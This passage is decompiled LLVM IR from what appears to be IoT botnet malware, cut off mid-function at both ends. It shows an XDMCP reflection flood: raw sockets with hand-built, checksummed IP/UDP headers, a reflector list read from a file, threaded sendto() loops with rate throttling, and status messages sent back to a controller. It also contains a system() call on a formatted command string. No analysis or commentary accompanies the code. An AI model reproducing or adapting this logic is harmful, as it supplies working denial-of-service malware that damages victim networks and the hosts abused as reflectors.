  %v5_100068f8 = inttoptr i32 %v1_100068f4 to i16*
  %v1_10006904 = add i32 %arg1, 12
  %v2_10006904 = inttoptr i32 %v1_10006904 to i32*
  %v3_10006904 = load i32, i32* %v2_10006904, align 4
  %v1_10006924 = add i32 %arg1, 4
  %v2_10006924 = inttoptr i32 %v1_10006924 to i32*
  %v3_10006924 = load i32, i32* %v2_10006924, align 4
  store i32 268462396, i32* @lr, align 4
  %v3_10006938 = call i32 @socket(i32 2, i32 3, i32 6)
  %tmp26 = icmp sgt i32 %v3_10006938, -1
  br i1 %tmp26, label %dec_label_pc_10006958, label %dec_label_pc_10006950

dec_label_pc_10006950:                            ; preds = %entry
  %v0_10006954 = call i32 @__GI_exit()
  br label %dec_label_pc_10006958

dec_label_pc_10006958:                            ; preds = %entry, %dec_label_pc_10006950
  store i32 268462432, i32* @lr, align 4
  %v1_1000695c = call i32 @__GI_time(i32 0)
  %v1_10006968 = call i32 @init_rand(i32 %v1_1000695c)
  store i32 %v2_100068e8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268462468, i32* @lr, align 4
  %v0_10006980 = call i32 @__GI_memset()
  store i32 268462476, i32* @lr, align 4
  %v2_10006988 = call i32 @setup_xdmcp_ip_header(i32* nonnull %stack_var_-4144)
  store i32 268462484, i32* @lr, align 4
  %v2_10006990 = call i32 @setup_xdmcp_udp_header(i16* %v5_100068f8)
  store i32 268462488, i32* @lr, align 4
  %v0_10006994 = call i32 @random()
  %v2_100069b4 = srem i32 %v0_10006994, 65535
  %fold = add nsw i32 %v2_100069b4, 64510
  %v1_100069e0 = urem i32 %fold, 65536
  store i32 %v1_100069e0, i32* @r3, align 4
  %v1_100069e8 = call i32 @htons(i32 %v1_100069e0)
  %v1_100069f4 = trunc i32 %v1_100069e8 to i16
  store i16 %v1_100069f4, i16* %v5_100068f8, align 4
  %v2_10006a00 = add i32 %v2_100068e8, 12
  %v3_10006a00 = inttoptr i32 %v2_10006a00 to i32*
  store i32 %v3_10006904, i32* %v3_10006a00, align 4
  %v1_10006a08 = add i32 %v3_10006924, 4
  %v2_10006a08 = inttoptr i32 %v1_10006a08 to i32*
  %v3_10006a08 = load i32, i32* %v2_10006a08, align 4
  %v2_10006a10 = add i32 %v2_100068e8, 16
  %v3_10006a10 = inttoptr i32 %v2_10006a10 to i32*
  store i32 %v3_10006a08, i32* %v3_10006a10, align 4
  %v1_10006a1c = or i32 %v2_100068e8, 2
  %v2_10006a1c = inttoptr i32 %v1_10006a1c to i16*
  %v3_10006a1c = load i16, i16* %v2_10006a1c, align 2
  %div = udiv i16 %v3_10006a1c, 2
  %v1_10006a24 = zext i16 %div to i32
  %v2_10006a34 = bitcast i32* %stack_var_-4144 to i16*
  %v3_10006a34 = call i32 @csum(i16* %v2_10006a34, i32 %v1_10006a24)
  %v1_10006a40 = trunc i32 %v3_10006a34 to i16
  %v3_10006a40 = add i32 %v2_100068e8, 10
  %v4_10006a40 = inttoptr i32 %v3_10006a40 to i16*
  store i16 %v1_10006a40, i16* %v4_10006a40, align 2
  store i32 1, i32* %stack_var_-32, align 4
  %v2_10006a4c = ptrtoint i32* %stack_var_-32 to i32
  store i32 268462700, i32* @lr, align 4
  %v5_10006a68 = call i32 @__GI_setsockopt(i32 %v3_10006938, i32 0, i32 3, i32 %v2_10006a4c, i32 4)
  %tmp28 = icmp sgt i32 %v5_10006a68, -1
  br i1 %tmp28, label %dec_label_pc_10006a80, label %dec_label_pc_10006a78

dec_label_pc_10006a78:                            ; preds = %dec_label_pc_10006958
  %v0_10006a7c = call i32 @__GI_exit()
  br label %dec_label_pc_10006a80

dec_label_pc_10006a80:                            ; preds = %dec_label_pc_10006958, %dec_label_pc_10006a78
  store i32 268462728, i32* @lr, align 4
  %v1_10006a84 = call i32 @__GI_time(i32 0)
  %v1_10006a90 = call i32 @init_rand(i32 %v1_10006a84)
  %v3_10006b0c = add i32 %v2_100068e8, 4
  %v4_10006b0c = inttoptr i32 %v3_10006b0c to i16*
  br label %dec_label_pc_10006a9c

dec_label_pc_10006a9c:                            ; preds = %dec_label_pc_10006b80, %dec_label_pc_10006a80
  %stack_var_-4160.0 = phi i32 [ %v3_10006924, %dec_label_pc_10006a80 ], [ %v3_10006ad8, %dec_label_pc_10006b80 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10006a80 ], [ %v1_10006b84, %dec_label_pc_10006b80 ]
  %v3_10006aa0 = load i16, i16* %v2_10006a1c, align 2
  %v4_10006aa0 = zext i16 %v3_10006aa0 to i32
  store i32 268462804, i32* @lr, align 4
  %v6_10006ad0 = call i32 @sendto(i32 %v3_10006938, i32 %v2_100068e8, i32 %v4_10006aa0, i32 0, i32 %stack_var_-4160.0, i32 16)
  %v1_10006ad8 = add i32 %stack_var_-4160.0, 532
  %v2_10006ad8 = inttoptr i32 %v1_10006ad8 to i32*
  %v3_10006ad8 = load i32, i32* %v2_10006ad8, align 4
  %v1_10006ae4 = add i32 %v3_10006ad8, 4
  %v2_10006ae4 = inttoptr i32 %v1_10006ae4 to i32*
  %v3_10006ae4 = load i32, i32* %v2_10006ae4, align 4
  store i32 %v3_10006ae4, i32* %v3_10006a10, align 4
  %v0_10006af0 = call i32 @rand_cmwc()
  store i32 %v0_10006af0, i32* @r3, align 4
  %v1_10006afc = call i32 @htonl(i32 %v0_10006af0)
  %v1_10006b0c = trunc i32 %v1_10006afc to i16
  store i16 %v1_10006b0c, i16* %v4_10006b0c, align 4
  %v3_10006b18 = load i16, i16* %v2_10006a1c, align 2
  %div29 = udiv i16 %v3_10006b18, 2
  %v1_10006b20 = zext i16 %div29 to i32
  %v3_10006b30 = call i32 @csum(i16* %v2_10006a34, i32 %v1_10006b20)
  %v1_10006b3c = trunc i32 %v3_10006b30 to i16
  store i16 %v1_10006b3c, i16* %v4_10006a40, align 2
  %v3_10006b44 = load i32, i32* @global_var_1004518c.119, align 4
  %v1_10006b48 = add i32 %v3_10006b44, 1
  store i32 %v1_10006b48, i32* @global_var_1004518c.119, align 4
  %v3_10006b58 = load i32, i32* @global_var_10045174.120, align 4
  %v3_10006b60 = icmp ugt i32 %v3_10006b58, %storemerge4
  br i1 %v3_10006b60, label %dec_label_pc_10006b80, label %dec_label_pc_10006b68

dec_label_pc_10006b68:                            ; preds = %dec_label_pc_10006a9c
  %v3_10006b74 = load i32, i32* @global_var_100450b4.121, align 4
  store i32 268462976, i32* @lr, align 4
  %v1_10006b7c = call i32 @usleep(i32 %v3_10006b74)
  br label %dec_label_pc_10006b80

dec_label_pc_10006b80:                            ; preds = %dec_label_pc_10006a9c, %dec_label_pc_10006b68
  %stack_var_-20.0 = phi i32 [ %storemerge4, %dec_label_pc_10006a9c ], [ 0, %dec_label_pc_10006b68 ]
  %v1_10006b84 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_10006a9c

; uselistorder directives
  uselistorder i32 %v3_10006ad8, { 1, 0 }
  uselistorder i32 %stack_var_-4160.0, { 1, 0 }
  uselistorder i32 %v1_100069e0, { 1, 0 }
  uselistorder i32 %v2_100068e8, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_10006b80, { 1, 0 }
  uselistorder label %dec_label_pc_10006a80, { 1, 0 }
  uselistorder label %dec_label_pc_10006958, { 1, 0 }
}

define i32 @sendTheXDMCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-1168 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10006b90 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10006b90, i32* %stack_var_-1168, align 4
  %v5_10006b90 = ptrtoint i32* %stack_var_-1168 to i32
  %v1_10006bc8 = call i32 @mfork(i32 %arg2)
  %v3_10006bd0 = icmp eq i32 %v1_10006bc8, 0
  br i1 %v3_10006bd0, label %dec_label_pc_10006bd8, label %dec_label_pc_10007280

dec_label_pc_10006bd8:                            ; preds = %entry
  store i32 268463080, i32* @lr, align 4
  %v3_10006be4 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp40 = icmp sgt i32 %v3_10006be4, -1
  br i1 %tmp40, label %dec_label_pc_10006c04, label %dec_label_pc_10006bfc

dec_label_pc_10006bfc:                            ; preds = %dec_label_pc_10006bd8
  %v0_10006c00 = call i32 @__GI_exit()
  br label %dec_label_pc_10006c04

dec_label_pc_10006c04:                            ; preds = %dec_label_pc_10006bd8, %dec_label_pc_10006bfc
  %v2_10006c08 = icmp sgt i32 %arg3, 5
  br i1 %v2_10006c08, label %dec_label_pc_10006c30, label %dec_label_pc_10006c10

dec_label_pc_10006c10:                            ; preds = %dec_label_pc_10006c04
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10006c24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([114 x i8]* @global_var_1002ad1c.307 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10006c2c = call i32 @__GI_exit()
  br label %dec_label_pc_10006c30

dec_label_pc_10006c30:                            ; preds = %dec_label_pc_10006c04, %dec_label_pc_10006c10
  store i32 268463160, i32* @lr, align 4
  %v1_10006c34 = call i32 @__GI_time(i32 0)
  %v1_10006c44 = add i32 %arg4, 24
  store i32 %v1_10006c44, i32* %r9.global-to-local, align 4
  %v1_10006c48 = inttoptr i32 %v1_10006c44 to i32*
  %v2_10006c48 = load i32, i32* %v1_10006c48, align 4
  %v1_10006c54 = add i32 %arg4, 12
  store i32 %v1_10006c54, i32* %r9.global-to-local, align 4
  %v1_10006c58 = inttoptr i32 %v1_10006c54 to i32*
  %v2_10006c58 = load i32, i32* %v1_10006c58, align 4
  store i32 %v2_10006c58, i32* @r3, align 4
  %v0_10006c60 = call i32 @__GI_strlen()
  %v1_10006c68 = mul i32 %v0_10006c60, 5
  store i32 %v1_10006c68, i32* %r9.global-to-local, align 4
  %v1_10006c6c = add i32 %v1_10006c68, 160
  %v2_10006c78 = icmp sgt i32 %v1_10006c6c, 1023
  br i1 %v2_10006c78, label %dec_label_pc_10007280, label %dec_label_pc_10006c80

dec_label_pc_10006c80:                            ; preds = %dec_label_pc_10006c30
  store i32 %v1_10006c54, i32* %r9.global-to-local, align 4
  %v2_10006c8c = load i32, i32* %v1_10006c58, align 4
  store i32 %v1_10006c54, i32* %r9.global-to-local, align 4
  %v2_10006c98 = load i32, i32* %v1_10006c58, align 4
  store i32 %v1_10006c54, i32* %r9.global-to-local, align 4
  %v2_10006ca4 = load i32, i32* %v1_10006c58, align 4
  store i32 %v1_10006c54, i32* %r9.global-to-local, align 4
  %v2_10006cb0 = load i32, i32* %v1_10006c58, align 4
  store i32 %v1_10006c54, i32* %r9.global-to-local, align 4
  %v2_10006cbc = load i32, i32* %v1_10006c58, align 4
  store i32 %v2_10006cbc, i32* %r11.global-to-local, align 4
  %v2_10006cc0 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_10006cc0, i32* @r3, align 4
  store i32 %v1_10006c6c, i32* @r4, align 4
  store i32 ptrtoint ([166 x i8]* @global_var_1002ad90.310 to i32), i32* @r5, align 4
  store i32 %v2_10006cb0, i32* %r9.global-to-local, align 4
  store i32 268463340, i32* @lr, align 4
  %v9_10006ce8 = call i32 @__GI_snprintf(i32 %v2_10006cc0, i32 %v1_10006c6c, i32 ptrtoint ([166 x i8]* @global_var_1002ad90.310 to i32), i32 %v2_10006c8c, i32 %v2_10006c98, i32 %v2_10006ca4, i32 %v2_10006cb0, i32 %v1_10006c6c)
  store i32 ptrtoint ([3 x i8]* @global_var_10006cf8.311 to i32), i32* @lr, align 4
  %v1_10006cf4 = call i32 @system(i32 %v2_10006cc0)
  store i32 268463360, i32* @lr, align 4
  %v1_10006cfc = call i32 @__GI_time(i32 0)
  store i32 ptrtoint (i32* @global_var_10006d0c.312 to i32), i32* @lr, align 4
  %v1_10006d08 = call i32 @srand(i32 %v1_10006cfc)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10045194.105, align 4
  store i32 128, i32* @r3, align 4
  store i32 268463412, i32* @lr, align 4
  %v0_10006d30 = call i32 @malloc()
  store i32 128, i32* %r9.global-to-local, align 4
  store i32 %v0_10006d30, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268463444, i32* @lr, align 4
  %v0_10006d50 = call i32 @__GI_memset()
  %v1_10006d60 = add i32 %arg4, 16
  store i32 %v1_10006d60, i32* %r9.global-to-local, align 4
  %v1_10006d64 = inttoptr i32 %v1_10006d60 to i32*
  %v2_10006d64 = load i32, i32* %v1_10006d64, align 4
  store i32 268463472, i32* @lr, align 4
  %v1_10006d6c = call i32 @atol(i32 %v2_10006d64)
  %v1_10006d7c = add i32 %arg4, 20
  store i32 %v1_10006d7c, i32* %r9.global-to-local, align 4
  %v1_10006d80 = inttoptr i32 %v1_10006d7c to i32*
  %v2_10006d80 = load i32, i32* %v1_10006d80, align 4
  store i32 268463500, i32* @lr, align 4
  %v1_10006d88 = call i32 @atol(i32 %v2_10006d80)
  store i32 0, i32* @global_var_10045174.120, align 4
  store i32 0, i32* @global_var_1004518c.119, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268463560, i32* @lr, align 4
  %v3_10006dc4 = call i32 @__GI_fopen(i32 ptrtoint ([7 x i8]* @global_var_1002ae38.313 to i32), i32 ptrtoint ([2 x i8]* @global_var_1002a6e0.110 to i32))
  %v2_10006de8 = add i32 %v0_10006d50, -1
  br label %dec_label_pc_10006f60.outer

dec_label_pc_10006dd4:                            ; preds = %dec_label_pc_10006f60
  store i32 %v0_10006d50, i32* @r3, align 4
  %v0_10006dd8 = call i32 @__GI_strlen()
  %v1_10006dec = add i32 %v0_10006dd8, %v2_10006de8
  store i32 %v1_10006dec, i32* %r9.global-to-local, align 4
  %v1_10006df0 = inttoptr i32 %v1_10006dec to i8*
  %v2_10006df0 = load i8, i8* %v1_10006df0, align 1
  %v3_10006df8 = icmp eq i8 %v2_10006df0, 10
  br i1 %v3_10006df8, label %dec_label_pc_10006e2c, label %dec_label_pc_10006e00

dec_label_pc_10006e00:                            ; preds = %dec_label_pc_10006dd4
  store i32 %v0_10006d50, i32* @r3, align 4
  %v0_10006e04 = call i32 @__GI_strlen()
  %v1_10006e18 = add i32 %v0_10006e04, %v2_10006de8
  store i32 %v1_10006e18, i32* %r9.global-to-local, align 4
  %v1_10006e1c = inttoptr i32 %v1_10006e18 to i8*
  %v2_10006e1c = load i8, i8* %v1_10006e1c, align 1
  %v3_10006e24 = icmp eq i8 %v2_10006e1c, 13
  br i1 %v3_10006e24, label %dec_label_pc_10006e2c, label %dec_label_pc_10006f60

dec_label_pc_10006e2c:                            ; preds = %dec_label_pc_10006e00, %dec_label_pc_10006dd4
  store i32 %v0_10006d50, i32* @r3, align 4
  %v0_10006e30 = call i32 @__GI_strlen()
  %v1_10006e44 = add i32 %v0_10006e30, %v2_10006de8
  %v3_10006e4c = inttoptr i32 %v1_10006e44 to i8*
  store i8 0, i8* %v3_10006e4c, align 1
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10006e54 = load i32, i32* @global_var_10045194.105, align 4
  %v3_10006e58 = icmp eq i32 %v3_10006e54, 0
  store i32 540, i32* @r3, align 4
  br i1 %v3_10006e58, label %dec_label_pc_10006e60, label %dec_label_pc_10006ee4

dec_label_pc_10006e60:                            ; preds = %dec_label_pc_10006e2c
  store i32 268463720, i32* @lr, align 4
  %v0_10006e64 = call i32 @malloc()
  store i32 %v0_10006e64, i32* @global_var_10045194.105, align 4
  store i32 %v0_10006e64, i32* %r9.global-to-local, align 4
  %v2_10006e84 = inttoptr i32 %v0_10006e64 to i32*
  store i32 0, i32* %v2_10006e84, align 4
  %v1_10006e8c = load i32, i32* %r9.global-to-local, align 4
  %v2_10006e8c = add i32 %v1_10006e8c, 4
  %v3_10006e8c = inttoptr i32 %v2_10006e8c to i32*
  store i32 0, i32* %v3_10006e8c, align 4
  %v1_10006e94 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006e94 = add i32 %v1_10006e94, 8
  %v3_10006e94 = inttoptr i32 %v2_10006e94 to i32*
  store i32 0, i32* %v3_10006e94, align 4
  %v1_10006e9c = load i32, i32* %r9.global-to-local, align 4
  %v2_10006e9c = add i32 %v1_10006e9c, 12
  %v3_10006e9c = inttoptr i32 %v2_10006e9c to i32*
  store i32 0, i32* %v3_10006e9c, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10006ea4 = load i32, i32* @global_var_10045194.105, align 4
  store i32 268463792, i32* @lr, align 4
  %v1_10006eac = call i32 @inet_addr(i32 %v0_10006d50)
  %v2_10006eb4 = add i32 %v3_10006ea4, 4
  %v3_10006eb4 = inttoptr i32 %v2_10006eb4 to i32*
  store i32 %v1_10006eac, i32* %v3_10006eb4, align 4
  %v3_10006ebc = load i32, i32* @global_var_10045194.105, align 4
  %v2_10006ec8 = add i32 %v3_10006ebc, 532
  %v3_10006ec8 = inttoptr i32 %v2_10006ec8 to i32*
  store i32 %v3_10006ebc, i32* %v3_10006ec8, align 4
  %v3_10006ed0 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10006ed0, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10006edc = add i32 %v3_10006ed0, 536
  %v3_10006edc = inttoptr i32 %v2_10006edc to i32*
  store i32 %v3_10006ed0, i32* %v3_10006edc, align 4
  br label %dec_label_pc_10006f54

dec_label_pc_10006ee4:                            ; preds = %dec_label_pc_10006e2c
  store i32 268463852, i32* @lr, align 4
  %v0_10006ee8 = call i32 @malloc()
  store i32 540, i32* %r9.global-to-local, align 4
  store i32 %v0_10006ee8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 540, i32* @r5, align 4
  store i32 268463884, i32* @lr, align 4
  %v0_10006f08 = call i32 @__GI_memset()
  store i32 268463892, i32* @lr, align 4
  %v1_10006f10 = call i32 @inet_addr(i32 %v0_10006d50)
  %v2_10006f1c = add i32 %v0_10006ee8, 4
  %v3_10006f1c = inttoptr i32 %v2_10006f1c to i32*
  store i32 %v1_10006f10, i32* %v3_10006f1c, align 4
  %v3_10006f24 = load i32, i32* @global_var_10045194.105, align 4
  %v2_10006f2c = add i32 %v0_10006ee8, 536
  %v3_10006f2c = inttoptr i32 %v2_10006f2c to i32*
  store i32 %v3_10006f24, i32* %v3_10006f2c, align 4
  %v3_10006f34 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10006f34, i32* %r9.global-to-local, align 4
  %v1_10006f38 = add i32 %v3_10006f34, 532
  %v2_10006f38 = inttoptr i32 %v1_10006f38 to i32*
  %v3_10006f38 = load i32, i32* %v2_10006f38, align 4
  %v2_10006f40 = add i32 %v0_10006ee8, 532
  %v3_10006f40 = inttoptr i32 %v2_10006f40 to i32*
  store i32 %v3_10006f38, i32* %v3_10006f40, align 4
  %v3_10006f48 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10006f48, i32* %r9.global-to-local, align 4
  %v2_10006f50 = add i32 %v3_10006f48, 532
  %v3_10006f50 = inttoptr i32 %v2_10006f50 to i32*
  store i32 %v0_10006ee8, i32* %v3_10006f50, align 4
  br label %dec_label_pc_10006f54

dec_label_pc_10006f54:                            ; preds = %dec_label_pc_10006e60, %dec_label_pc_10006ee4
  store i32 %stack_var_-1128.0.ph, i32* %r9.global-to-local, align 4
  %v1_10006f58 = add i32 %stack_var_-1128.0.ph, 1
  br label %dec_label_pc_10006f60.outer

dec_label_pc_10006f60.outer:                      ; preds = %dec_label_pc_10006f54, %dec_label_pc_10006c80
  %stack_var_-1128.0.ph = phi i32 [ %v1_10006f58, %dec_label_pc_10006f54 ], [ 0, %dec_label_pc_10006c80 ]
  br label %dec_label_pc_10006f60

dec_label_pc_10006f60:                            ; preds = %dec_label_pc_10006f60.outer, %dec_label_pc_10006e00
  store i32 268463984, i32* @lr, align 4
  %v3_10006f6c = call i32 @fgets(i32 %v0_10006d50, i32 128, i32 %v3_10006dc4)
  %v3_10006f74 = icmp eq i32 %v3_10006f6c, 0
  br i1 %v3_10006f74, label %dec_label_pc_10006f7c, label %dec_label_pc_10006dd4

dec_label_pc_10006f7c:                            ; preds = %dec_label_pc_10006f60
  %v3_10006f80 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10006f80, i32* %r9.global-to-local, align 4
  %v1_10006f84 = add i32 %v3_10006f80, 532
  %v2_10006f84 = inttoptr i32 %v1_10006f84 to i32*
  %v3_10006f84 = load i32, i32* %v2_10006f84, align 4
  %v1_10006f90 = mul i32 %v1_10006d6c, 4
  %v1_10006f98 = add i32 %v1_10006f90, 30
  %v1_10006f9c = and i32 %v1_10006f98, -16
  %v2_10006fa4 = load i32, i32* %stack_var_-1168, align 4
  %v1_10006fac = load i32, i32* @r1, align 4
  %v3_10006fac = sub i32 %v1_10006fac, %v1_10006f9c
  %v4_10006fac = inttoptr i32 %v3_10006fac to i32*
  store i32 %v2_10006fa4, i32* %v4_10006fac, align 4
  %v1_10006fbc = add i32 %v3_10006fac, 23
  %v1_10006fc0 = and i32 %v1_10006fbc, -16
  %v1_10006fe0 = add i32 %arg4, 4
  store i32 %v1_10006fe0, i32* %r9.global-to-local, align 4
  %v1_10006fe4 = inttoptr i32 %v1_10006fe0 to i32*
  %v2_10006fe4 = load i32, i32* %v1_10006fe4, align 4
  store i32 268464112, i32* @lr, align 4
  %v1_10006fec = call i32 @inet_addr(i32 %v2_10006fe4)
  %v1_10006ffc = mul i32 %v1_10006d6c, 24
  %v1_10007000 = add i32 %v1_10006ffc, 15
  store i32 %v1_10007000, i32* %r9.global-to-local, align 4
  %v1_10007004 = add i32 %v1_10006ffc, 30
  %v1_10007008 = and i32 %v1_10007004, -16
  %v0_10007010 = load i32, i32* @r1, align 4
  %v1_10007010 = inttoptr i32 %v0_10007010 to i32*
  %v2_10007010 = load i32, i32* %v1_10007010, align 4
  %v3_10007018 = sub i32 %v0_10007010, %v1_10007008
  %v4_10007018 = inttoptr i32 %v3_10007018 to i32*
  store i32 %v2_10007010, i32* %v4_10007018, align 4
  %v1_10007028 = add i32 %v3_10007018, 23
  %v1_1000702c = and i32 %v1_10007028, -16
  store i32 %v1_10006d6c, i32* %r9.global-to-local, align 4
  %v2_100070fc2 = icmp sgt i32 %v1_10006d6c, 0
  br i1 %v2_100070fc2, label %dec_label_pc_1000704c, label %dec_label_pc_10007104

dec_label_pc_1000704c:                            ; preds = %dec_label_pc_10006f7c, %dec_label_pc_1000704c
  %storemerge15 = phi i32 [ %v1_100070ec, %dec_label_pc_1000704c ], [ 0, %dec_label_pc_10006f7c ]
  %v1_10007054 = mul i32 %storemerge15, 24
  %v2_10007058 = add i32 %v1_10007054, %v1_1000702c
  %v2_10007060 = inttoptr i32 %v2_10007058 to i32*
  store i32 %storemerge15, i32* %v2_10007060, align 8
  store i32 %v2_10007058, i32* %r9.global-to-local, align 4
  store i32 %v1_10006fec, i32* %r11.global-to-local, align 4
  store i32 %tmp7, i32* @r8, align 4
  %v2_10007084 = add i32 %v2_10007058, 8
  %v3_10007084 = inttoptr i32 %v2_10007084 to i32*
  store i32 2, i32* %v3_10007084, align 8
  %v0_10007088 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007088 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007088 = add i32 %v1_10007088, 12
  %v3_10007088 = inttoptr i32 %v2_10007088 to i32*
  store i32 %v0_10007088, i32* %v3_10007088, align 4
  %v0_1000708c = load i32, i32* @r10, align 4
  %v1_1000708c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000708c = add i32 %v1_1000708c, 16
  %v3_1000708c = inttoptr i32 %v2_1000708c to i32*
  store i32 %v0_1000708c, i32* %v3_1000708c, align 4
  %v1_10007090 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007090 = add i32 %v1_10007090, 20
  %v3_10007090 = inttoptr i32 %v2_10007090 to i32*
  store i32 %tmp7, i32* %v3_10007090, align 4
  %v1_100070a4 = or i32 %v2_10007058, 4
  %v2_100070ac = inttoptr i32 %v1_100070a4 to i32*
  store i32 %v3_10006f84, i32* %v2_100070ac, align 4
  %v1_100070b8 = mul i32 %storemerge15, 4
  %v2_100070bc = add i32 %v1_100070b8, %v1_10006fc0
  store i32 %v2_100070bc, i32* %r11.global-to-local, align 4
  store i32 268435456, i32* %r9.global-to-local, align 4
  store i32 268464360, i32* @lr, align 4
  %v6_100070e4 = inttoptr i32 %v2_100070bc to i32*
  %v7_100070e4 = call i32 @pthread_create(i32* %v6_100070e4, i32 0, i32 268462280, i32 %v2_10007058, i32 %tmp7, i32 268435456)
  %v1_100070ec = add nuw nsw i32 %storemerge15, 1
  store i32 %v1_10006d6c, i32* %r9.global-to-local, align 4
  %v2_100070fc = icmp slt i32 %v1_100070ec, %v1_10006d6c
  br i1 %v2_100070fc, label %dec_label_pc_1000704c, label %dec_label_pc_10007104

dec_label_pc_10007104:                            ; preds = %dec_label_pc_1000704c, %dec_label_pc_10006f7c
  store i32 %v1_10006fe0, i32* %r9.global-to-local, align 4
  %v2_1000710c = load i32, i32* %v1_10006fe4, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10007128 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002ae40.314 to i32), i32 %arg2, i32 %v2_1000710c)
  store i32 %v1_10006c44, i32* %r9.global-to-local, align 4
  %v2_1000713c = load i32, i32* %v1_10006c48, align 4
  store i32 268464456, i32* @lr, align 4
  %v1_10007144 = call i32 @atol(i32 %v2_1000713c)
  %v2_10007150 = mul i32 %v1_10007144, 20
  store i32 %v2_10007150, i32* %r9.global-to-local, align 4
  %v3_10007158 = icmp sgt i32 %v2_10007150, 0
  br i1 %v3_10007158, label %dec_label_pc_10007160, label %dec_label_pc_10007278

dec_label_pc_10007160:                            ; preds = %dec_label_pc_10007104
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268464504, i32* @lr, align 4
  %v1_10007174 = call i32 @usleep(i32 50000)
  %v3_1000717c = load i32, i32* @global_var_1004518c.119, align 4
  %v2_10007184 = mul i32 %v3_1000717c, 20
  %v3_1000718c = icmp ugt i32 %v2_10007184, %v1_10006d88
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10007198 = load i32, i32* @global_var_10045174.120, align 4
  br i1 %v3_1000718c, label %dec_label_pc_10007194, label %dec_label_pc_100071d4

dec_label_pc_10007194:                            ; preds = %dec_label_pc_10007160
  %v2_1000719c = icmp sgt i32 %v3_10007198, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_1000719c, label %dec_label_pc_100071bc, label %dec_label_pc_100071a4

dec_label_pc_100071a4:                            ; preds = %dec_label_pc_10007194
  %v3_100071a8 = load i32, i32* @global_var_100450b4.121, align 4
  %v1_100071ac = add i32 %v3_100071a8, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_100071ac, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_1000721c

dec_label_pc_100071bc:                            ; preds = %dec_label_pc_10007194
  %v1_100071c4 = add i32 %v3_10007198, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_100071c4, i32* @global_var_10045174.120, align 4
  br label %dec_label_pc_1000721c

dec_label_pc_100071d4:                            ; preds = %dec_label_pc_10007160
  %v1_100071dc = add i32 %v3_10007198, 1
  store i32 %v1_100071dc, i32* @global_var_10045174.120, align 4
  %v3_100071ec = load i32, i32* @global_var_100450b4.121, align 4
  %tmp41 = icmp ult i32 %v3_100071ec, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_10007210, label %dec_label_pc_100071f8

dec_label_pc_100071f8:                            ; preds = %dec_label_pc_100071d4
  %v1_10007200 = add i32 %v3_100071ec, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10007200, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_1000721c

dec_label_pc_10007210:                            ; preds = %dec_label_pc_100071d4
  store i32 0, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_1000721c

dec_label_pc_1000721c:                            ; preds = %dec_label_pc_100071f8, %dec_label_pc_100071bc, %dec_label_pc_100071a4, %dec_label_pc_10007210
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_1004518c.119, align 4
  %v2_1000724c = add i32 %v2_10006c48, %v1_10006c34
  br label %dec_label_pc_10007228

dec_label_pc_10007228:                            ; preds = %dec_label_pc_10007268, %dec_label_pc_1000721c
  %stack_var_-1120.0 = phi i32 [ %tmp, %dec_label_pc_1000721c ], [ %v1_1000726c, %dec_label_pc_10007268 ]
  %tmp42 = icmp slt i32 %stack_var_-1120.0, 100
  br i1 %tmp42, label %dec_label_pc_10007268, label %dec_label_pc_10007234

dec_label_pc_10007234:                            ; preds = %dec_label_pc_10007228
  store i32 268464700, i32* @lr, align 4
  %v1_10007238 = call i32 @__GI_time(i32 0)
  store i32 %v1_10007238, i32* %r11.global-to-local, align 4
